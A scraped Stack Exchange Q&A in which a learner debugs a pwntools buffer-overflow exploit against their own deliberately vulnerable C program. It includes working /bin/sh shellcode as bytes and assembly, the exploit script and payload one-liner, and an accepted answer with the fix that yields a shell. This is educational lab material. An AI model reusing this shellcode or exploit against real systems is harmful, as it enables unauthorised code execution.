{
    "title": "Buffer overflow: pwntools does not give me a shell, despite exploit working without pwntools",
    "link": "https://reverseengineering.stackexchange.com/questions/26134/buffer-overflow-pwntools-does-not-give-me-a-shell-despite-exploit-working-with",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  Recently, I've been trying to learn how to use the pwntools library. I am trying to exploit the following program using pwntools:\n </p>\n <pre><code>#include <stdio.h>\n#include <stdlib.h>\n\nint main(void) {\n    char buf[256];\n\n    printf(\"Buffer is at %p.\n\", buf);\n    printf(\"Type in your name: \");\n    fgets(buf, 1000, stdin);\n    printf(\"Hello %s\", buf);\n\n    return 0;\n}\n</code></pre>\n <p>\n  It has been compiled using\n  <code>\n   gcc -o bof bof.c -fno-stack-protector -z execstack\n  </code>\n  . I am able to exploit the vulnerability if I disable ASLR. My exploit just has shellcode that executes /bin/sh, some useless NOPs, and finally the location of my shellcode on the stack.\n </p>\n <pre><code>$ python -c \"import sys; sys.stdout.buffer.write(b'\\x48\\x31\\xc0\\x48\\x31\\xff\\xb0\\x03\\x0f\\x05\\x50\\x48\\xbf\\x2f\\x64\\x65\\x76\\x2f\\x74\\x74\\x79\\x57\\x54\\x5f\\x50\\x5e\\x66\\xbe\\x02\\x27\\xb0\\x02\\x0f\\x05\\x48\\x31\\xc0\\xb0\\x3b\\x48\\x31\\xdb\\x53\\xbb\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xe3\\x10\\x66\\xbb\\x62\\x69\\x48\\xc1\\xe3\\x10\\xb7\\x2f\\x53\\x48\\x89\\xe7\\x48\\x83\\xc7\\x01\\x48\\x31\\xf6\\x48\\x31\\xd2\\x0f\\x05' + b'\\x90' * 186 + b'\\x50\\xdd\\xff\\xff\\xff\\x7f')\" | ./bof\nBuffer is at 0x7fffffffdd50.\n$ echo hello world\nhello world\n$ exit\nsh: 2: Cannot set tty process group (No such process)\n</code></pre>\n <p>\n  Yet, when I try doing the exact same thing within pwntools, I get the following:\n </p>\n <pre><code>$ python bof.py \n[+] Starting local process './bof': pid 10967\nReceived: b'Buffer is at 0x7fffffffdd40.\n'\nUsing address: b'@\\xdd\\xff\\xff\\xff\\x7f\\x00\\x00'\nUsing payload:\nb\"H1\\xc0H1\\xff\\xb0\\x03\\x0f\\x05PH\\xbf/dev/ttyWT_P^f\\xbe\\x02'\\xb0\\x02\\x0f\\x05H1\\xc0\\xb0;H1\\xdbS\\xbbn/shH\\xc1\\xe3\\x10f\\xbbbiH\\xc1\\xe3\\x10\\xb7/SH\\x89\\xe7H\\x83\\xc7\\x01H1\\xf6H1\\xd2\\x0f\\x05\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90@\\xdd\\xff\\xff\\xff\\x7f\\x00\\x00\"\n\n[*] Switching to interactive mode\n$ \n$ $ \n[*] Got EOF while sending in interactive\n</code></pre>\n <p>\n  This is the code inside of bof.py:\n </p>\n <pre><code>from pwn import *\n  \n# Start the process\ncontext.update(arch=\"i386\", os=\"linux\")\np = process(\"./bof\")\nreceived = str(p.recvline())\nprint(\"Received: \" + received)\n\n# Get the address of the buffer\nbuffer_addr_str = received.split()[3:][0][:-4]\nbuffer_addr = p64(int(buffer_addr_str, 16))\nprint(\"Using address: \" + str(buffer_addr))\n\n# Generate the payload\npayload = b'\\x48\\x31\\xc0\\x48\\x31\\xff\\xb0\\x03\\x0f\\x05\\x50\\x48\\xbf\\x2f\\x64\\x65\\x76\\x2f\\x74\\x74\\x79\\x57\\x54\\x5f\\x50\\x5e\\x66\\xbe\\x02\\x27\\xb0\\x02\\x0f\\x05\\x48\\x31\\xc0\\xb0\\x3b\\x48\\x31\\xdb\\x53\\xbb\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xe3\\x10\\x66\\xbb\\x62\\x69\\x48\\xc1\\xe3\\x10\\xb7\\x2f\\x53\\x48\\x89\\xe7\\x48\\x83\\xc7\\x01\\x48\\x31\\xf6\\x48\\x31\\xd2\\x0f\\x05'\nnops = b'\\x90' * (264 - len(payload))\nprint(\"Using payload:\")\nprint(payload+nops+buffer_addr)\nprint()\n\n# Trigger the buffer overflow\np.send(payload + nops + buffer_addr)\np.interactive()\n</code></pre>\n <p>\n  This is the shellcode that I'm using:\n </p>\n <pre><code>section .text\nglobal _start\n_start:\n\n; Syscall to close stdin\nxor rax, rax\nxor rdi, rdi ; Zero represents stdin\nmov al, 3 ; close(0)\nsyscall\n\n; open(\"/dev/tty\", O_RDWR | ...)\npush rax ; Push a NULL byte onto the stack\nmov rdi, 0x7974742f7665642f ; Move \"/dev/tty\" (written backwards) into rdi.\npush rdi ; Push the string \"/dev/tty\" onto the stack.\npush rsp ; Push a pointer to the string onto the stack.\npop rdi ; rdi now has a pointer to the string \"/dev/tty\"\n        ; This is equivalent to doing \"mov rdi, rsp\"\npush rax ; Push a NULL byte onto the stack\npop rsi ; Make rsi NULL\n        ; This is equivalent to doing \"mov rsi, 0\"\nmov si, 0x2702 ; Flag for O_RDWR\nmov al, 0x2 ; Syscall for sys_open\nsyscall\n\n; Syscall for execve\nxor rax, rax\nmov al, 59\n\n; Push a NULL byte onto the stack\nxor rbx, rbx\npush rbx\n\n; Push /bin/sh onto the stack and get a pointer to it in rdi\nmov rbx, 0x68732f6e ; Move \"n/sh\" into rbx (written backwards).\nshl rbx, 16 ; Make 2 extra bytes of room in rbx\nmov bx, 0x6962 ; Move \"bi\" into rbx. Rbx is now equal to \"bin/sh\" written backwards.\nshl rbx, 16 ; Make 2 extra bytes of room in rbx\nmov bh, 0x2f ; Move \"/\" into rbx. Rbx is now equal to \"/bin/sh\" written backwards.\npush rbx ; Move the string \"/bin/sh\" onto the stack\nmov rdi, rsp ; Get a pointer to the string \"/bin/sh\" in rdi\nadd rdi, 1 ; Add one to rdi (because there is a NULL byte at the beginning)\n\n; Make these values NULL\nxor rsi, rsi\nxor rdx, rdx\n\n; Do the syscall\nsyscall\n</code></pre>\n <p>\n  I don't understand why calling p.interactive() doesn't spawn a shell. I am sending the same kind of payload that I would be sending if this was being done outside of pwntools. Why am I not getting a shell?\n </p>\n <p>\n  Edit: This is what I see when I run the script with DEBUG:\n </p>\n <pre><code>$ python bof.py DEBUG\n[+] Starting local process './bof' argv=[b'./bof']  env={b'SHELL': b'/bin/bash', b'SESSION_MANAGER': b'local/N:@/tmp/.ICE-unix/3778,unix/N:/tmp/.ICE-unix/3778', b'QT_ACCESSIBILITY': b'1', b'COLORTERM': b'truecolor', b'XDG_CONFIG_DIRS': b'/etc/xdg/xdg-ubuntu:/etc/xdg', b'XDG_MENU_PREFIX': b'gnome-', b'GNOME_DESKTOP_SESSION_ID': b'this-is-deprecated', b'LANGUAGE': b'en_US:en', b'MANDATORY_PATH': b'/usr/share/gconf/ubuntu.mandatory.path', b'LC_ADDRESS': b'en_US.UTF-8', b'GNOME_SHELL_SESSION_MODE': b'ubuntu', b'LC_NAME': b'en_US.UTF-8', b'SSH_AUTH_SOCK': b'/run/user/1000/keyring/ssh', b'XMODIFIERS': b'@im=ibus', b'DESKTOP_SESSION': b'ubuntu', b'LC_MONETARY': b'en_US.UTF-8', b'SSH_AGENT_PID': b'3743', b'GTK_MODULES': b'gail:atk-bridge', b'PWD': b'/home/n/Documents/Exploitation/basics', b'LOGNAME': b'n', b'XDG_SESSION_DESKTOP': b'ubuntu', b'XDG_SESSION_TYPE': b'x11', b'GPG_AGENT_INFO': b'/run/user/1000/gnupg/S.gpg-agent:0:1', b'XAUTHORITY': b'/run/user/1000/gdm/Xauthority', b'GJS_DEBUG_TOPICS': b'JS ERROR;JS LOG', b'WINDOWPATH': b'2', b'HOME': b'/home/n', b'USERNAME': b'n', b'IM_CONFIG_PHASE': b'1', b'LC_PAPER': b'en_US.UTF-8', b'LANG': b'en_US.UTF-8', b'LS_COLORS': b'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', b'XDG_CURRENT_DESKTOP': b'ubuntu:GNOME', b'VTE_VERSION': b'6003', b'GNOME_TERMINAL_SCREEN': b'/org/gnome/Terminal/screen/ff3cb1d9_3c32_4305_b119_f9818ba98eb0', b'INVOCATION_ID': b'f6142bf9cd0a472eadfed7888909b8da', b'MANAGERPID': b'3551', b'GJS_DEBUG_OUTPUT': b'stderr', b'GEM_HOME': b'/home/n/gems', b'LESSCLOSE': b'/usr/bin/lesspipe %s %s', b'XDG_SESSION_CLASS': b'user', b'TERM': b'xterm-256color', b'LC_IDENTIFICATION': b'en_US.UTF-8', b'DEFAULTS_PATH': b'/usr/share/gconf/ubuntu.default.path', b'LESSOPEN': b'| /usr/bin/lesspipe %s', b'USER': b'n', b'GNOME_TERMINAL_SERVICE': b':1.166', b'DISPLAY': b':0', b'SHLVL': b'1', b'LC_TELEPHONE': b'en_US.UTF-8', b'QT_IM_MODULE': b'ibus', b'LC_MEASUREMENT': b'en_US.UTF-8', b'PAPERSIZE': b'letter', b'XDG_RUNTIME_DIR': b'/run/user/1000', b'LC_TIME': b'en_US.UTF-8', b'JOURNAL_STREAM': b'9:50754', b'XDG_DATA_DIRS': b'/usr/share/ubuntu:/usr/local/share/:/usr/share/:/var/lib/snapd/desktop', b'PATH': b'/home/n/gems/bin:/home/n/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin', b'GDMSESSION': b'ubuntu', b'DBUS_SESSION_BUS_ADDRESS': b'unix:path=/run/user/1000/bus', b'LC_NUMERIC': b'en_US.UTF-8', b'_': b'/usr/bin/python3', b'OLDPWD': b'/home/n/Documents/Exploitation'} : pid 21335\n[DEBUG] Received 0x1d bytes:\n    b'Buffer is at 0x7fffffffdd40.\n'\nReceived: b'Buffer is at 0x7fffffffdd40.\n'\nUsing address: b'@\\xdd\\xff\\xff\\xff\\x7f\\x00\\x00'\nUsing payload:\nb\"H1\\xc0H1\\xff\\xb0\\x03\\x0f\\x05PH\\xbf/dev/ttyWT_P^f\\xbe\\x02'\\xb0\\x02\\x0f\\x05H1\\xc0\\xb0;H1\\xdbS\\xbbn/shH\\xc1\\xe3\\x10f\\xbbbiH\\xc1\\xe3\\x10\\xb7/SH\\x89\\xe7H\\x83\\xc7\\x01H1\\xf6H1\\xd2\\x0f\\x05\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90@\\xdd\\xff\\xff\\xff\\x7f\\x00\\x00\"\n\n[DEBUG] Sent 0x110 bytes:\n    00000000  48 31 c0 48  31 ff b0 03  0f 05 50 48  bf 2f 64 65  │H1·H│1···│··PH│·/de│\n    00000010  76 2f 74 74  79 57 54 5f  50 5e 66 be  02 27 b0 02  │v/tt│yWT_│P^f·│·'··│\n    00000020  0f 05 48 31  c0 b0 3b 48  31 db 53 bb  6e 2f 73 68  │··H1│··;H│1·S·│n/sh│\n    00000030  48 c1 e3 10  66 bb 62 69  48 c1 e3 10  b7 2f 53 48  │H···│f·bi│H···│·/SH│\n    00000040  89 e7 48 83  c7 01 48 31  f6 48 31 d2  0f 05 90 90  │··H·│··H1│·H1·│····│\n    00000050  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│\n    *\n    00000100  90 90 90 90  90 90 90 90  40 dd ff ff  ff 7f 00 00  │····│····│@···│····│\n    00000110\n[*] Switching to interactive mode\n$ \n[DEBUG] Sent 0x1 bytes:\n    10 * 0x1\n[DEBUG] Received 0x2 bytes:\n    b'$ '\n$ $ \n[DEBUG] Sent 0x1 bytes:\n    10 * 0x1\n[*] Got EOF while sending in interactive\n</code></pre>\n <p>\n  Edit 2: I attached a debugger to my program by changing\n  <code>\n   p = process(\"./bof\")\n  </code>\n  to\n  <code>\n   p = gdb.debug(\"./bof\")\n  </code>\n  . I set a breakpoint at\n  <code>\n   main\n  </code>\n  and stepped through the program. It did eventually execute my shellcode correctly. However, after the last syscall in my shellcode executed, I got the following instead of getting a shell:\n </p>\n <pre><code>0x00007fffffffdd8c in ?? ()\n[ Legend: Modified register | Code | Heap | Stack | String ]\n───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────\n$rax   : 0x3b              \n$rbx   : 0x68732f6e69622f00\n$rcx   : 0x00007fffffffdd62  →  0xdb31483bb0c03148\n$rdx   : 0x0               \n$rsp   : 0x00007fffffffde30  →  0x68732f6e69622f00\n$rbp   : 0x9090909090909090\n$rsi   : 0x0               \n$rdi   : 0x00007fffffffde31  →  0x0068732f6e69622f (\"/bin/sh\"?)\n$rip   : 0x00007fffffffdd8c  →  0x909090909090050f\n$r8    : 0xfffffffffffffff9\n$r9    : 0x114             \n$r10   : 0x0000555555556032  →   add BYTE PTR [rax], al\n$r11   : 0x346             \n$r12   : 0x0000555555555080  →  <_start+0> endbr64 \n$r13   : 0x00007fffffffdf30  →  0x0000000000000001\n$r14   : 0x0               \n$r15   : 0x0               \n$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]\n$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 \n───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────\n0x00007fffffffde30│+0x0000: 0x68732f6e69622f00   ← $rsp\n0x00007fffffffde38│+0x0008: 0x0000000000000000\n0x00007fffffffde40│+0x0010: \"/dev/tty\"\n0x00007fffffffde48│+0x0018: 0x0000000000000000\n0x00007fffffffde50│+0x0020: 0x00007ffff7ff000a  →   add BYTE PTR [rbp-0x77], cl\n0x00007fffffffde58│+0x0028: 0x00007fffffffdf38  →  0x00007fffffffe2ab  →  0x485300666f622f2e (\"./bof\"?)\n0x00007fffffffde60│+0x0030: 0x0000000100000000\n0x00007fffffffde68│+0x0038: 0x0000555555555169  →  <main+0> endbr64 \n─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────\n   0x7fffffffdd82                  add    rdi, 0x1\n   0x7fffffffdd86                  xor    rsi, rsi\n   0x7fffffffdd89                  xor    rdx, rdx\n → 0x7fffffffdd8c                  syscall \n   0x7fffffffdd8e                  nop    \n   0x7fffffffdd8f                  nop    \n   0x7fffffffdd90                  nop    \n   0x7fffffffdd91                  nop    \n   0x7fffffffdd92                  nop    \n─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────\n[#0] Id 1, Name: \"bof\", stopped, reason: SINGLE STEP\n───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────\n[#0] 0x7fffffffdd8c → syscall \n────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────\ngef➤  \nprocess 32648 is executing new program: /bin/dash\nReading /bin/dash from remote target...\nReading /bin/dash from remote target...\nReading /bin/2a16ad1517b3d714e7b3bdb5470b2c82eb25ff.debug from remote target...\nReading /bin/.debug/2a16ad1517b3d714e7b3bdb5470b2c82eb25ff.debug from remote target...\nReading /usr/lib/debug//bin/2a16ad1517b3d714e7b3bdb5470b2c82eb25ff.debug from remote target...\nReading /usr/lib/debug/bin//2a16ad1517b3d714e7b3bdb5470b2c82eb25ff.debug from remote target...\nReading target:/usr/lib/debug/bin//2a16ad1517b3d714e7b3bdb5470b2c82eb25ff.debug from remote target...\nError in re-setting breakpoint 1: Function \"main\" not defined.\nReading /lib64/ld-linux-x86-64.so.2 from remote target...\nReading /lib64/ld-linux-x86-64.so.2 from remote target...\nReading /lib64/ld-2.31.so from remote target...\nReading /lib64/.debug/ld-2.31.so from remote target...\nReading /usr/lib/debug//lib64/ld-2.31.so from remote target...\nReading /usr/lib/debug/lib64//ld-2.31.so from remote target...\nReading target:/usr/lib/debug/lib64//ld-2.31.so from remote target...\nReading /lib/x86_64-linux-gnu/libc.so.6 from remote target...\nReading /lib/x86_64-linux-gnu/libc-2.31.so from remote target...\nReading /lib/x86_64-linux-gnu/.debug/libc-2.31.so from remote target...\nReading /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.31.so from remote target...\nReading /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.31.so from remote target...\n</code></pre>\n</div>\n</body></html>",
    "votes": "1",
    "answers": 1,
    "views": "5k",
    "tags": [
        "python",
        "exploit",
        "buffer-overflow",
        "pwntools"
    ],
    "user": "TigerThePredator",
    "time": "Oct 20, 2020 at 1:54",
    "comments": [
        {
            "user": "Paweł Łukasik",
            "text": "<html><body><span class=\"comment-copy\">\n the script works if I run it on my machine. Maybe try running the script with DEBUG? It should print some extra data. Maybe there's something that can explain this behavior.\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "TigerThePredator",
            "text": "<html><body><span class=\"comment-copy\">\n @PawełŁukasik I updated my post to include what happened when I ran the script with DEBUG enabled.\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "Paweł Łukasik",
            "text": "<html><body><span class=\"comment-copy\">\n It looks like there's something sending more data after switching to interactive - there should be only your input after that.\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "TigerThePredator",
            "text": "<html><body><span class=\"comment-copy\">\n @PawełŁukasik I need to hit enter after I run the script so that my payload actually gets sent, which appears as extra data in the debug statement. If I don't hit enter, my payload never gets sent to the process. Even if that wasn't the case, why would it make any difference in the exploit? It is also worth noting that the second last \"$\" character that gets printed out on my screen is white (instead of pwntool's default red), which indicates that a shell is being created. So why am I unable to interact with that shell, and why does it give me an EOF? Is this a bug in pwntools?\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  If you change your process startup to\n </p>\n <pre><code>p = process([\"strace\", \"-o\", \"strace.out\", \"./bof\"])\n</code></pre>\n <p>\n  and check the resulting\n  <code>\n   strace.out\n  </code>\n  file, you will see:\n </p>\n <pre><code>close(0)                                = 0\nopen(\"/dev/tty\", O_RDWR|O_NOCTTY|O_TRUNC|O_APPEND|FASYNC) = 0\nexecve(\"/bin/sh\", NULL, NULL)           = 0\n...\nread(0, 0x55ae7a6d5aa0, 8192)           = -1 EIO (Input/output error)\n</code></pre>\n <p>\n  So this has to do with shellcode reopening\n  <code>\n   stdin\n  </code>\n  as\n  <code>\n   /dev/tty\n  </code>\n  .\n </p>\n <p>\n  Let's check\n  <a href=\"https://docs.pwntools.com/en/stable/tubes/processes.html#pwnlib.tubes.process.process\" rel=\"nofollow noreferrer\">\n   the doc\n  </a>\n  :\n </p>\n <pre><code>stdin (int) – File object or file descriptor number to use for stdin.\nBy default, a pipe is used. A pty can be used instead by setting this\nto PTY. This will cause programs to behave in an interactive manner\n(e.g.., python will show a >>> prompt). If the application reads from\n/dev/tty directly, use a pty.\n</code></pre>\n <p>\n  and do as it says:\n </p>\n <pre><code>p = process(\"./bof\", stdin=PTY)\n</code></pre>\n <p>\n  Voila!\n </p>\n <pre><code>[*] Switching to interactive mode\nType in your name: $ \n$ $ id -u\n1000\n</code></pre>\n</div>\n</body></html>",
            "votes": "3",
            "user": "mephi42",
            "time": "Oct 20, 2020 at 12:39",
            "is_accepted": true,
            "comments": [
                {
                    "user": "TigerThePredator",
                    "text": "<span class=\"comment-copy\">This worked, thanks for this</span>",
                    "time": null
                }
            ]
        }
    ]
}